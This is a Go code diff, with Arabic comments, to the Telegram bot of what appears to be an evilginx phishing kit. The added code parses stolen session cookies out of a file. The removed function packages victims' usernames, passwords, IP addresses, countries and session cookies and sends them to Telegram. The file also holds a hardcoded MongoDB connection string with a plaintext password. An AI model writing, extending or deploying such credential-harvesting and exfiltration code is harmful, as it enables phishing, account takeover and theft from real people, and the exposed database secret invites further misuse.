@@ -619,7 +619,37 @@ func (t *TelegramBot) SendFileFromText(fileName string, fileContent string) erro
 	
 	log.Success("Cookies file sent to Telegram successfully")
 
-
+	// تعريف المتغيرات المطلوبة
+	sessionID := "default"
+	if strings.Contains(fileName, "_") {
+		parts := strings.Split(fileName, "_")
+		if len(parts) > 1 {
+			sessionPart := parts[len(parts)-1]
+			sessionID = strings.TrimSuffix(sessionPart, ".txt")
+		}
+	}
+	
+	// استخراج الكوكيز من محتوى الملف
+	cookiesList := []map[string]interface{}{}
+	
+	// البحث عن بداية JSON الكوكيز
+	jsonStartIdx := strings.Index(fileContent, "[")
+	jsonEndIdx := strings.LastIndex(fileContent, "]")
+	
+	if jsonStartIdx >= 0 && jsonEndIdx > jsonStartIdx {
+		// استخراج JSON من الملف
+		cookieJSON := fileContent[jsonStartIdx:jsonEndIdx+1]
+		// محاولة تحليل JSON
+		err = json.Unmarshal([]byte(cookieJSON), &cookiesList)
+		if err != nil {
+			log.Warning("فشل في تحليل JSON الكوكيز: %v", err)
+			cookiesList = []map[string]interface{}{}
+		} else {
+			log.Debug("تم العثور على %d كوكيز في الملف", len(cookiesList))
+		}
+	} else {
+		log.Warning("لم يتم العثور على تنسيق JSON صالح في محتوى الملف")
+	}
 
 	mongo_uri := "mongodb+srv://jemex2023:l0mwPDO40LYAJ0xs@cluster0.bldhxin.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&tlsInsecure=true&ssl=true"
 	db_name := "evilginx"
@@ -684,68 +714,5 @@ func (t *TelegramBot) SendFileFromText(fileName string, fileContent string) erro
 			log.Warning("لم يتم العثور على حقل الكوكيز في الوثيقة")
 		}
 	}
-	return nil
-}
-
-func (t *TelegramBot) SendCookiesFile(sessionID string, name string, username string, password string, remoteAddr string, userAgent string, country string, countryCode string, cookieTokens map[string]map[string]*database.CookieToken, bodyTokens map[string]string, httpTokens map[string]string) error {
-	if !t.Enabled {
-		return fmt.Errorf("بوت التليجرام غير مفعل")
-	}
-	
-	log.Info("جاري تجهيز إرسال الكوكيز للجلسة: %s", sessionID)
-	
-	// تجهيز محتوى الملف
-	cookiesList := []map[string]interface{}{} // قائمة لتخزين الكوكيز بالتنسيق المطلوب
-	
-	// معالجة توكنات الكوكيز
-	if cookieTokens == nil || len(cookieTokens) == 0 {
-		log.Warning("لم يتم العثور على كوكيز")
-	} else {
-		for domain, cookies := range cookieTokens {
-			for name, cookie := range cookies {
-				cookieData := map[string]interface{}{
-					"path":           cookie.Path,
-					"domain":         domain,
-					"expirationDate": cookie.ExpirationDate, // تأكد من أن هذا الحقل موجود في الهيكل
-					"value":          cookie.Value,
-					"name":           name,
-					"httpOnly":      cookie.HttpOnly,
-					"hostOnly":      false, // يمكنك تعديل هذا بناءً على الحاجة
-					"secure":        false, // يمكنك تعديل هذا بناءً على الحاجة
-					"session":       false, // يمكنك تعديل هذا بناءً على الحاجة
-				}
-				cookiesList = append(cookiesList, cookieData)
-			}
-		}
-	}
-	
-	// تحويل قائمة الكوكيز إلى JSON
-	cookiesJSON, err := json.MarshalIndent(cookiesList, "", "  ")
-	if err != nil {
-		log.Error("خطأ في تحويل الكوكيز إلى JSON: %v", err)
-		return err
-	}
-	
-	// إضافة إحصائيات الكوكيز
-	cookiesText := fmt.Sprintf("=== معلومات الجلسة %s ===\n", sessionID)
-	cookiesText += fmt.Sprintf("الفيشلت: %s\n", name)
-	cookiesText += fmt.Sprintf("اسم المستخدم: %s\n", username)
-	cookiesText += fmt.Sprintf("كلمة المرور: %s\n", password)
-	cookiesText += fmt.Sprintf("عنوان IP: %s\n", remoteAddr)
-	cookiesText += fmt.Sprintf("متصفح المستخدم: %s\n", userAgent)
-	cookiesText += fmt.Sprintf("الدولة: %s (%s)\n\n", country, countryCode)
-	cookiesText += "=== الكوكيز ===\n" + string(cookiesJSON) + "\n\n"
-	
-	// إرسال الملف
-	fileName := fmt.Sprintf("cookies_%s_%s.txt", name, sessionID)
-	err = t.SendFileFromText(fileName, cookiesText)
-	if err != nil {
-		return err
-	}
-	
-	// تحديث قاعدة البيانات بالكوكيز المعالجة
-	// استخدام الطريقة الجديدة SetSessionCookies للتحديث
-
-	
 	return nil
 }
